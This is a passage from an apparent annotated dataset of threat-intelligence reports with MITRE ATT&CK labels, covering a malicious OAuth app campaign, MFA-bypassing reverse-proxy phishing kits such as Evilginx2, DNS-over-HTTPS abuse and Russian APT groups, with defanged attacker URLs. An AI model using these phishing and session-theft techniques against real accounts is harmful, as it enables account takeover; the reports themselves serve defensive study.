"Zeus"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "PyLocky"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"], ["MALWARE", "TinyNuke"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "OiVaVoii \u2013 An Active Malicious Hybrid Cloud Threats Campaign\nJanuary 27, 2022\n### **Key Findings**\n**Campaign highlights:**\n* Beginning January 18, 2022, Proofpoint researchers observed a new malicious hybrid cloud campaign named OiVaVoii.\n* This campaign uses hijacked Office 365 tenants and a sophisticated combination of cleverly-crafted lures, malicious OAuth apps and targeted phishing threats.\n**Potential Impact:**\u00a0We have seen account takeovers (through malicious OAuth apps stealing OAuth tokens and through credential theft).\nThere are other potential risks after account takeovers, chiefly: persistent DLP risks, continued phishing, lateral movement, brand abuse and malware proliferation.\n**People impact:**\u00a0Successfully taken over many C-level executives\u2019 accounts, including CEOs, general managers, former board members and presidents.\n**Advised remediation actions:**\n* Microsoft has blocked many of the apps.\n* However, while original publishers\u2019 accounts remain compromised, the campaign stays alive - new apps can be created and authorized.\n(Microsoft response times and solutions not sufficient for blocking all attempts).\n* Currently, active malicious apps will be detected and can be revoked/deleted through Proofpoint CASB.\n### **Attack Chain of OiVaVoii Campaign**\nBy analyzing monitored email traffic and cloud users\u2019 activities, Proofpoint researchers have so far uncovered five malicious OAuth applications attributed to the campaign (nicknamed \u201c*OiVaVoii*\u201d by analysts due to its associated domain).\nBelow are examples of malicious apps created by a \u201cverified\u201d organization (\"Yuma Counseling Services\") and by a non-verified organization as part of the same campaign.\nAt least three of these condemned third-party apps were created by two different \u201cverified publishers,\u201d meaning the app\u2019s owner was likely a compromised admin user-account within a legitimate Office tenant.\nOut of the remaining two apps, at least one was created by a non-verified organization, which could imply leveraging a (third) hijacked cloud environment or using a dedicated malicious Office tenant.\nOnce these apps were created, authorization requests were then sent, via email, to numerous targeted users, including high-level executives.\nThe seemingly benign identity of the publishing organization was a substantial advantage, causing multiple unsuspecting victims to authorize these applications.\nThis enables the attackers to generate OAuth tokens on the compromised user\u2019s behalf and complete the account takeover.\nThis modus-operandi is similar to the one previously covered in our\u00a0[recent blog](/us/blog/email-and-cloud-threats/how-attackers-use-compromised-accounts-create-and-distribute-malicious \"How Attackers Use Compromised Accounts to Create and Distribute Malicious OAuth Apps\").\n### **Highlights from this campaign**\n* **Reply URL manipulation:**attackers use the Reply URL to redirect back to the consent screen autonomously.\nThis means that clicking \u201cCancel\u201d simply reloads the same page, keeping the user in a loop.\n* **Microsoft logo:**Some apps impersonate Microsoft software, using icon impersonation.\n* **MITM:**\u00a0apps potentially use MITM proxy attacks.\nThis means that credential theft could take place as part of the attack flow, greatly increasing the risk of a complete account takeover and prolonged persistency.\n* **C-level executives targeted:**a high percentage of targeted and compromised C-level executives was seen.\nAmongst detected affected titleholders are CEOs, presidents, board members, VPs and other high-profile users.\n* **Application scopes:**\u00a0all detected apps requested similar permissions, pertaining mainly to mailbox access (read and write), allowing them to send internal and external malicious email messages, steal valuable information, and create mailbox rules (applied for data leakage and persistency purposes).\n### **Detected malicious applications**\n| **App name** | **App id** | **Published Type** | **Creation Date** | **Status** |\n| *Upgrade* | 01d33e0a-83c1-4e5c-98be-096bc270eabf | Verified | 16/11/21 | Blocked |\n| *Upgrade* | f9b75e84-5235-48d3-b745-37c99c056b64 | Verified | 23/1/22 | Blocked |\n| *Document* | c517e6b9-a1d5-4f7e-8081-dfb2142c056a | Verified | 26/1/22 | Blocked |\n| *Shared* | b2710450-6cec-4e4f-989f-c16f3041620a | Unverified | 27/1/22| Available |\n| *UserInfo* | 32fc064d-d4ea-43f9-ae7f-e90da936053f | Unknown | 27/1/22 | Blocked |\nAssociated Reply URLs:\n* hxxps://queues[.]me/callback\n* hxxps://voii[.]at/callback\n* hxxps://viox[.]dev/callback\n### **Screenshots of malicious third party OAuth apps used in this campaign**\n![MSFT](/sites/default/files/inline-images/Screen%20Shot%202022-01-27%20at%204.33.19%20PM.png)\n![MSFT](/sites/default/files/inline-images/Screen%20Shot%202022-01-27%20at%204.33.39%20PM.png)\n![MSFT](/sites/default/files/inline-images/Screen%20Shot%202022-01-27%20at%204.34.02%20PM.png)\n![MSFT](/sites/default/files/inline-images/Screen%20Shot%202022-01-27%20at%204.34.32%20PM.png)\n### **Protecting against this campaign**\nIt is important to note that although Microsoft eventually blocked further authorizations, existing instances of these apps still pose a threat to impacted organizations until they\u2019re revoked or deleted.\nAs we monitor the threat, we expect to see new apps being created and proliferated.\nTherefore, we advise taking immediate prevention measures, such as limiting app authorization by users\u2019 and using layered defense solutions for early detection and remediation.\nIn case of confirmed impact, we advise immediate revocation and deletion of malicious apps, along with suspicious mailbox rules, hosted files, and messages.\nThis ongoing campaign was automatically surfaced to\u00a0[Proofpoint CASB](/us/products/cloud-security/cloud-app-security-broker \"Cloud App Security Broker\"),\u00a0\n[Proofpoint Targeted Attack Protection](/us/products/advanced-threat-protection/targeted-attack-protection \"Targeted Attack Protection\")\u00a0and\u00a0\n[Proofpoint Emerging Threats Intelligence](/us/products/advanced-threat-protection/et-intelligence \"ET Intelligence\")\u00a0customers thanks to the integrated visibility across cloud and email threats enriched by internal threat intelligence.", "mitre_ids": ["T1566", "T1566", "T1528", "T1528", "T1566", "TA0008", "T1528", "T1566", "T1528", "T1528", "T1566", "T1557", "T1557", "TA0006", "T1078", "TA0010", "T1528"], "anno_name_label": [], "cti_entity_class": ["CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "MFA PSA, Oh My!\nFebruary 03, 2022\n### Key Takeaways\n* As multi-factor authentication becomes a standard security practice, phish kits are evolving with the times to steal these tokens and bypass this trusted layer of security.\n* Threat actors are using phish kits that leverage transparent reverse proxy, which enables them to man-in-the-middle (MitM) a browser session and steal credentials and session cookies in real-time.\n* It is likely that more threat actors will turn to these MitM phish kits, making security increasingly difficult for defenders.\n### Overview\nSince the inclusion of the first password in the\u00a0[Compatible Time-Sharing System](https://en.wikipedia.org/wiki/Password#History)\u00a0at MIT in 1961, people have been cognizant of information security.\nWhile multi-factor authentication (MFA) did not enter the scene until years later in 1986 with the first RSA tokens, it has recently seen widespread adoption in the consumer space.\nAccording to MFA digital authenticator company Duo's annual\u00a0[State of the Auth Report](https://duo.com/blog/the-2021-state-of-the-auth-report-2fa-climbs-password-managers-biometrics-trend)\u00a078% of respondents have used two/multi-factor authentication (2FA/MFA) in 2021 compared to just 28% in 2017.\nWhile many companies like Duo and RSA have helped make MFA more ubiquitous and user-friendly, threat actors have not been resting on their laurels, choosing to target MFA as well as looking for ways to bypass MFA with evolving phishing kits.\n![Duo State of the Auth Report 2021 shows increase in MFA usage.](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.17.28%20AM.png)\n*Figure 1. Duo State of the Auth Report 2021 shows increase in MFA usage.*\n### MFA Phishing Kit Evolution\nPhishing kits are software developed to aid threat actors in harvesting credentials and quickly capitalizing on them.\nOften installed on a dedicated server owned by the threat actor or covertly installed on a compromised server owned by an unlucky individual, many of these kits can be purchased for\u00a0[less than a cup of coffee](/us/blog/threat-insight/have-money-latte-then-you-too-can-buy-phish-kit \"Have Money for a Latte.\nThen You Too Can Buy a Phish Kit\").\nProofpoint threat researchers see numerous MFA phishing kits ranging from simple open-source kits with human readable code and no-frills functionality to sophisticated kits utilizing numerous layers of obfuscation and built-in modules that allow for stealing usernames, passwords, MFA tokens, social security numbers and credit card numbers.\nAt their core these kits are using the same techniques for harvesting credentials as the traditional kits that steal only usernames and passwords.\n![Simple phishing kit utilizing an open directory ](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.19.05%20AM.png)\n*Figure 2. Simple phishing kit utilizing an open directory with credentials stored on the same webserver as the kit.*\nIn recent years, Proofpoint researchers have observed the emergence of a new type of kit that does not rely on recreating a target website.\nInstead, these kits use a\u00a0[transparent reverse proxy](https://en.wikipedia.org/wiki/Reverse_proxy#:~:text=In%20computer%20networks%2C%20a%20reverse,mainly%20used%20to%20balance%20load. to present the actual website to the victim.\nModern web pages are dynamic and change frequently.\nTherefore, presenting the actual site instead of a facsimile greatly enhances the illusion an individual is logging in safely.\nAnother advantage of the reverse proxy is that it allows the threat actor to man-in-the-middle (MitM) a session and capture not only the usernames and passwords in real-time, but also the session cookie.\n![MitM Transparent Reverse Proxy](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.19.29%20AM.png)\n*Figure 3. MitM Transparent Reverse Proxy.*\nThe session cookie (see Figure 4) can then be used by the threat actor to gain access to the targeted account without the need for a username, password, or MFA token.\n![Evilginx2 LinkedIn session cookie example](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.19.50%20AM.png)\n*Figure 4. Evilginx2 LinkedIn session cookie example.*\nProofpoint researchers have noted a small increase in the use of these phish kits and anticipate greater adoption by threat actors as MFA forces them to adapt.\nSpecifically, Proofpoint has noted three transparent reverse proxy kits emerging on the scene.\n### Reverse Proxy Phish Kits\nModlishka: A Polish security researcher Piotr Duszy\u0144ski developed Modliska and released it in December 2018 on github.com.\nThis relatively simple tool allows phishing one site at a time, sports a command line interface, and provides the threat actor with a handy GUI to retrieve the credentials and session information (see Figure 5).\nModlishka also integrates Let\u2019s Encrypt so it can make the fake domain landing page just a bit more believable by encrypting the traffic and providing the little padlock in the web bar.\nWhile Modlishka may not be as advanced as the other two kits discussed later in this blog, it is still capable of harvesting a victim\u2019s session even when tech like Duo\u2019s push notification\u00a0[authenticator is used](https://commons.lib.jmu.edu/cgi/viewcontent.cgi?article=1004&context=masters202029).\n![Modliska graphical user interface (GUI).](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.20.07%20AM.png)\n*Figure 5. Modliska graphical user interface (GUI).*\nMuraena/Necrobrowser: Muraena/Necrobrowser is a two-part tool for phishing session cookies, credentials, and much more.\nCreated in 2019 by Giuseppe Trotta and Michele Orr\u00f9, Muraena runs server-side and uses a crawler to scan the target site to ensure it can properly rewrite all the traffic needed to not alert the victim.\nOnce the victim's credentials and session cookie has been harvested by the threat actor, they can deploy Necrobrowser.\nNecrobrowser is a headless browser, which is a browser without a graphical user interface used for automation, that leverages the stolen session cookies to log into the target site and do things such as change passwords, disable Google Workspace notifications, dump emails, change SSH session keys in GitHub, and download all code repositories.\nEvilginx2: Evilginx2 is an easy to use, transparent reverse proxy written in Golang by security researcher and developer Kuba Gretzky (Figure 6).\nThis is a popular tool for both red teams and threat actors as it is easy to setup and configure using its proprietary \u201cphishlets.\nPhishlets are\u00a0[yaml](https://en.wikipedia.org/wiki/YAML)\u00a0configuration files the engine uses to configure the proxy to the target site.\nUtilizing these \u201cphishlets,\u201d you can configure the server to phish multiple brands at once.\nEvilginx2 allows you to configure a custom subdomain and landing page URL for each as well.\nThe kit comes with several pre-installed \u201cphishlets,\u201d but more can be created and added easily.\nOnce a victim clicks on the malicious link, they are taken to a secure page with assets being displayed exactly how they are on the target site.\nAfter they log in, the credentials, including MFA codes, and session cookie are sent to the server in real-time and the victim is either redirected to a different page or allowed to continue through to the page.\nThe threat actor is then able to use the stolen session cookie to log in as the victim where they can take multiple actions like changing the password, copying data, or pretending to be the victim.\n![Evilginx2 command line console](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.21.39%20AM.png)\n*Figure 6. Evilginx2 command line console.*\n### Outlook\nMost of these kits have been around for years so why the renewed interest.\nIn their\u00a0[recent paper](https://catching-transparent-phish.github.io/catching_transparent_phish.pdf), researchers from Stony Brook University and Palo Alto Networks (Kondracki et al) took a deep dive into MitM phishing kits and discovered that MitM phishing pages represent an industry blind spot.\nThe researchers developed a machine learning tool called Phoca to scan suspected phishing pages and try to determine if they were using a transparent reverse proxy to MitM credentials.\nThey were able to identify over 1200 MitM phishing sites.\nOf those 1200+ sites only 43.7% of domains and 18.9% of IP addresses appeared on popular blocklists like VirusTotal.\nIn addition to this, they found that standard phishing sites had a lifespan of just under 24 hours whereas MitM phishing sites lasted longer, and 15% had a lifespan greater than 20 days.\nAs recently as the end of January 2021, Proofpoint researchers identified a MitM reverse proxy site that was active for more than 72 hours.\n![MitM O365 page.](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.22.38%20AM.png)\n*Figure 7. MitM O365 page.(domain redacted as without the full path it redirects to NSFW content)*\nIn May 2021, Google discussed in a\u00a0[blog post](https://blog.google/technology/safety-security/a-simpler-and-safer-future-without-passwords/)\u00a0that they would soon start to require MFA when logging into a Google account sometime in late 2021 or early 2022 (it would still be optional for Google Workspace customers).\nWe are now in 2022, the pandemic still rages, many workers are still working from home, and many may not return to the office.\nAs more companies follow Google\u2019s lead and start requiring MFA, threat actors will rapidly move to solutions like these MitM kits.\nThey are easy to deploy, free to use, and have proven effective at evading detection.\nThe industry needs to prepare to deal with blind spots like these before they can evolve in new unexpected directions.", "mitre_ids": ["T1566", "T1111", "T1557", "T1566", "T1557", "T1555", "T1557", "T1566", "T1566", "T1566", "TA0006", "T1566", "T1566", "T1027", "TA0006", "TA0006", "TA0006", "T1566", "T1566", "T1555", "T1557", "T1566", "T1557", "T1557", "T1539", "T1557", "T1557", "T1539", "T1566", "T1566", "T1566", "T1539", "T1566", "T1539", "T1539", "T1539", "T1539", "T1213", "T1078", "T1098", "T1566", "T1566", "T1539", "T1078", "T1005", "T1557", "T1557", "T1566", "T1566", "T1557", "T1566", "T1557", "T1566", "T1557", "T1566", "T1557", "T1557", "T1557", "T1557"], "anno_name_label": [["TOOL", "Evilginx2"], ["TOOL", "Evilginx2"], ["TOOL", "Necrobrowser"], ["TOOL", "Necrobrowser"], ["TOOL", "Necrobrowser"], ["TOOL", "Necrobrowser"], ["TOOL", "Evilginx2"], ["TOOL", "Evilginx2"], ["TOOL", "Evilginx2"], ["TOOL", "Evilginx2"], ["TOOL", "Evilginx2"]], "cti_entity_class": ["CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "How DNS-over-HTTPS (DoH) has Changed the Threat Landscape For Companies\nFeb 16, 2021\nExecutive Summary\n-----------------\nDNS-over-HTTPS (DoH) protocol is now offered and in some instances standard, in major Internet browsers.\nDoH provides the benefit of communicating DNS information over a secure HTTPS connection in an encrypted manner.\nThe protocol offers increased privacy for home-users but presents new challenges for enterprise networks and new opportunities for malicious actors.\nIn order to prevent evolving threats from malware authors, organizations should stay updated and follow the latest security recommendations.\n>\n> ### Pros this protocol offers to organizations:\n>\n>\n>\n* Improving privacy and confidentiality by preventing data interception.\n* Preventing Man-in-the-Middle (MitM) attacks.\n* Enhancing security of information in transit.\n>\n> ### **Cons this protocol offers to organizations:**\n>\n>\n>\n* Interfering with national surveillance laws in several countries.\n* Potential information leakage when attempting to resolve internal DNS records.\n* Losing visibility into DNS traffic.\n* Losing control of DNS data.\nIntroduction to\u00a0DNS-over-HTTPS (DoH)\n------------------------------------\nIn 2017, [the Internet Engineering Task Force (IETF) proposed a new standard](https://tools.ietf.org/html/rfc8484) for the Internet protocol named DNS-over-HTTPS (DoH).\nDoH is meant as a secure alternative to the existing standard Domain Name System (DNS) protocol for sharing IP addresses.\nThe DoH protocol communicates DNS information over a secure HTTPS connection in an encrypted manner.\nHowever, DoH does not provide end-to-end security and only protects communications while in transit.\nThe primary benefit of DoH is that it encrypts all DNS information, whereas DNS is currently sent in plain text over HTTP.\nTherefore, DoH offers more privacy and data protection, especially from Man-in-the-Middle (MitM) attacks (e.g. DNS hijacking and spoofing) that would allow for snooping and manipulation of the DNS information.\nGoogle Chrome and Mozilla Firefox were early adopters, having rolled out DoH in their respective browsers in late 2019.\nMalicious Activities and Threats Observed Early On\n--------------------------------------------------\nMalware authors have rushed to exploit DoH in their attack operations because a victim\u2019s DNS traffic will now often bypass organizational DNS infrastructure, circumventing security detection and protection systems.\nAt the time of initial rollout in 2019, we assessed it would be very likely that more malware families would begin to incorporate DoH into their operations, as well as new data-exfiltration tools leveraging DoH as C2.\nIn fact, in July 2020 Researchers from Kaspersky reported on [Iran-linked threat actor group *APT34*](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) (also known as *OilRig*) evolving tactics using DNS-over-HTTPS (DoH) as a channel for data exfiltration through an open-source tool.\nThe evolution was first discovered in May 2020, when the threat actor group used the publicly available tool DNSExfiltrator2 to move data laterally through the internal network and attempted to exfiltrate to an attacker-controlled system.\nAdditionally, in August and November 2020, [QuoIntelligence detected targeted campaigns that share similarities to the threat actor we previously dubbed ReconHellcat.](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) Among the state-of-the-art techniques leveraged by ReconHellcat, the group also used Cloudflare Workers as a C2 communication interface and DoH as their name resolution channel.\nImplications of DoH for Organizations\nWith the introduction of DoH by Internet browsers and operating systems, companies are often unable to detect compromised hosts based on DNS traffic analysis.\nMonitoring solutions built around DNS identification are now outdated and unable to deal with new threats from malicious actors.\nAdditionally, [while configuring DNS logging can increase network visibility](https://media.defense.gov/2021/Jan/14/2002564889/-1/-1/0/CSI_ADOPTING_ENCRYPTED_DNS_U_OO_102904_21.PDF), network administrators will need to incorporate supplemental tools and services to prevent users in the organization from accessing certain non-work-related sites and malicious domains.\n>\n> Here are some of the threats Information Security Operations and Engineering will soon have to face:\n> ----------------------------------------------------------------------------------------------------\n>\n>\n>\n* **Bypassed security measures**: [According to Qihoo 360 researchers](https://blog.netlab.360.com/an-analysis-of-godlua-backdoor-en/), the first malware spotted in the wild using DoH was employed by threat actors operating a new backdoor malware dubbed Godlua.\nShortly thereafter, [ProofPoint researchers](https://www.proofpoint.com/us/threat-insight/post/psixbot-now-using-google-dns-over-https-and-possible-new-sexploitation-module) detailed a new variant of the PsiXBot malware incorporating Google\u2019s DoH service.\nMalware authors implement DoH in their attack operations because a victim\u2019s DNS traffic will mostly bypass the organization\u2019s DNS infrastructure, circumventing security protections.\n* **Data leakage:**\u00a0Employees using an enterprise network which responds to internal names, such as the address of an application or server, will inadvertently leak company data within DNS data routed outside the organization to public DNS servers.\n* **Incompatibility with established regulation:** The rapid adaption of DoH could negatively affect the ability of governments to monitor terrorist threats or to censor and ban other illegal content.\nFor example, [the UK\u2019s 2016 Investigatory Powers Act](https://services.parliament.uk/bills/2015-16/investigatorypowers.html) requires ISPs to store 12-month web visit history for its citizens, achieved using now often-encrypted DNS requests.\n+ In April 2020, chief information officers of agencies within the US Government were recommended to disable third party encrypted DNS services.\nIn a Memo from then-director Chris Krebs, the offers were reminded of their obligation to use the EINSTEIN 3 Accelerated (E3A) DNS services on systems connected to federal agency networks.\nRecommended actions to reduce the risk of implications\n------------------------------------------------------\nIn January 2021, [the US National Security Agency (NSA) released an updated guideline](https://media.defense.gov/2021/Jan/14/2002564889/-1/-1/0/CSI_ADOPTING_ENCRYPTED_DNS_U_OO_102904_21.PDF) \u00a0for companies adopting DoH in enterprise environments.\nThe following tables of high- and medium-risk threats and remedial actions related to the DoH protocol in enterprise networks has been updated to include a summary of these latest recommendations.\n[![Table of Threats & Mitigations](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"High-Level Risk Threat & Mitigation\")\n![Table of Threats & Mitigations](https://quointelligence.eu/wp-content/uploads/2021/02/1.png \"High-Level Risk Threat & Mitigation\")](https://quointelligence.eu/wp-content/uploads/2021/02/1.png \"Table of Threats & Mitigations\")\n###### Table 1: High-risk threats and remedial actions related to the DoH protocol in enterprise networks by QuoIntelligence\n[![Table of Medium-Threats and Mitigations](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Medium-Threat Level and Remedial Actions\")\n![Table of Medium-Threats and Mitigations](https://quointelligence.eu/wp-content/uploads/2021/02/2.png \"Medium-Threat Level and Remedial Actions\")](https://quointelligence.eu/wp-content/uploads/2021/02/2.png \"Table of Medium-Threats and Mitigations\")\n###### Table 2: Medium-risk threats and remedial actions related to the DoH protocol in enterprise networks by QuoIntelligence\nConclusion\n----------\nWhile the DNS-over-HTTPS protocol offers increased privacy and security, it also enables users and threat actors to bypass traditional network controls used to secure a network.\nIn order for enterprises to make their own switch to DoH, which could introduce a network blind spot, and to prepare for new external threats, a plan must be established.\nOrganizations must enhance their infrastructure capabilities to detect and mitigate threat actors and insiders attempting to bypass network-level security controls.\n[Get in touch!](https://quointelligence.eu/talk-to-an-expert/)\nJoin Our Newsletter.\n--------------------\nSubscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates.\nOnly valid business emails will be approved.\nPlease enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy).\nGDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry.\nMessageSubscribe", "mitre_ids": ["T1557", "T1557", "T1557", "TA0011", "T1001", "G0049", "G0049", "T1041", "T1001", "T1041", "TA0011", "T1001", "TA0005", "TA0005", "TA0005"], "anno_name_label": [["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["MALWARE", "Godlua"], ["MALWARE", "PsiXBot"]], "cti_entity_class": ["CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI"]}, {"cti_report": "US Sanctions Against Russia Unlikely to Limit Russian Cyber Espionage\nApr 28, 2021\nThe US recently imposed punitive measures against Russia, including financial sanctions and diplomatic expulsions.\nThe sanctions are in\u00a0response\u00a0to the\u00a0[SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html)\u00a0and Russia\u2019s alleged interference in the 2020 US Presidential elections.\nThe US sanctioned a total of 32 entities and individuals.\nIt also set new restrictions on buying Russian sovereign debt and designated six Russian technology companies that support the Russian Intelligence Services\u2019 cyber program.\nMoreover, the US will expel ten Russian diplomatic personnel from the US.\nThe\u00a0White House stated that it attributes the cyber espionage campaign that exploited SolarWinds to the Russian Foreign Intelligence Service (SVR)\u00a0with high\u00a0confidence.\nThis campaign, conducted through Russian APT Group\u00a0*APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations.\n**In a hurry?** Check out the [infographic](#russian-cyber-espionage-infographic) for the most relevant information on the topic.\nCountering Russia\u2019s Cyber Espionage Campaigns\n---------------------------------------------\nTo counter Russia\u2019s moves in cyberspace, the White House announced further steps to promote a framework for responsible state behavior in cyberspace.\nThey also outlined a set of actions to improve US cyber defensive capabilities and resiliency.\nPoland and the Czech Republic also expelled Russian diplomats in solidarity with US sanctions.\nNATO, the UK, and the EU\u00a0also\u00a0joined\u00a0in, publicly supporting the\u00a0US.\u00a0\nIn turn, Russia\u00a0continued\u00a0to deny\u00a0its involvement in the\u00a0cyber\u00a0campaign\u00a0and retaliated, sanctioning US officials and expelling US, Czech, and Polish diplomats.\nWhile the US previously sanctioned Russia, past sanctions mainly punished election interference and disinformation campaigns.\nThe most notable example was the US sanctions on Russia for its interference in the 2016 US elections.\nThey also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine\u2019s power grid back in 2015.\nThe Wider Scale of\u00a0Russian APT Groups\u00a0\u00a0Demands more Serious Measures\n--------------------------------------------------------------------\nHowever, past US administrations largely refrained from retaliating for cyber espionage.\nDespite the efforts of governments and international organizations to create a code of conduct for acceptable behavior in cyberspace, espionage as such is not illegal.\nIn addition, the US and other western nations [also participate in such activities](https://www.axios.com/american-cyber-warfare-solarwinds-d50815d6-2e03-4e3c-83ab-9d2f5e20d6f5.html).\nWhy start sanctioning cyber espionage now.\nThe difference in the case of SolarWinds could lie in the broad scope and scale of the cyber espionage campaign.\nIt carried the potential for network degradation and had a significant impact on the private sector.\nGiven this new precedent, sanctions on nations carrying out cyber espionage could become more frequent.\nHowever, the main issue is that sanctions on Russia have failed to deter the country in the past.\nTherefore, the newest sanctions might not deter Russia but likely exacerbate tensions between Russia and the US.\n[![Infographic on Russian Intelligence Services and Associated Russian APT Groups](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot 2020-12-23 at 19.19.11\")\n![Infographic on Russian Intelligence Services and Associated Russian APT Groups](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg \"Screenshot 2020-12-23 at 19.19.11\")](https://quointelligence.eu/wp-content/uploads/2021/04/Russian-sanctioned-companies.jpg \"Infographic on Russian Intelligence Services and Associated Russian APT Groups\")\n[Get in Touch](https://quointelligence.eu/talk-to-an-expert/)\nRussian-sponsored APT\u00a0Groups\u00a0and Targeted Sectors\n-------------------------------------------------\nAs tensions are likely to manifest in cyberspace,\u00a0QuoIntelligence provides an overview of the key Russian Advanced Persistent Threat (APTs) groups,\u00a0including\u00a0targeted sectors and Tactics, Techniques, and Procedures (TTPs).\n### The following APTs are\u00a0reportedly\u00a0connected to Russian intelligence services:\n### APT 29\nActive since at least 2008, this cyber espionage group is allegedly responsible for attacks on foreign governments and commercial organizations.\nTheir targets were mainly in the US and in the UK, Netherlands, and Norway.\nThe US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign.\n### ReconHellcat\nActive since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware.\nThe attack used state-of-the-art techniques, such as [DNS over HTTPs (DoH)](https://quointelligence.eu/2021/02/dns-over-https-doh/), and targeted at least the defense and diplomatic government bodies in Armenia and Bulgaria.\nIn January 2021, [we detected a new malware, which we dubbed BlackSoul](https://quointelligence.eu/2021/01/reconhellcat-uses-nist-theme-as-lure-to-deliver-new-blacksoul-malware/).\nIt shared multiple similarities with ReconHellcat.\nBased on the advanced\u00a0TTPs\u00a0and the discovered targets, we classified the threat actor as an Advanced Persistent Threat (APT) group.\nIn addition,\u00a0ReconHellcat\u00a0shares\u00a0similarities\u00a0with [APT28.](#apt28)\n### APT28\nActive since at least 2007, APT28 primarily targets government, military, and security organizations globally.\nResearchers have linked APT28 activity to Russia\u2019s General Staff Main Intelligence Directorate (GRU) and 85th Main Special Service Center (GTsSS).\nIn August 2020, we detected an ongoing APT28 campaign, which revealed correlations with a ReconHell/BlackWater attack.\n[APT28 delivered the\u00a0Zebrocy\u00a0malware](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) in the campaign and used an upcoming NATO training as a lure.\nThe campaign targeted\u00a0NATO members and\u00a0at least\u00a0one\u00a0government body in Azerbaijan.\n### Turla\nActive since at least 2004, Turla targets government, military, technology, and energy sectors.\nTurla has also targeted foreign embassies as well as commercial organizations to conduct espionage campaigns.\n### Additionally, we collected Russian APT groups without proven connections to Russian Intelligence services below:\n### Xenotime\nSince at least 2014, this APT has targeted critical infrastructure in the Middle East, Europe, and North America.\nThe group has used TRITON malware to manipulate industrial safety systems.\n### 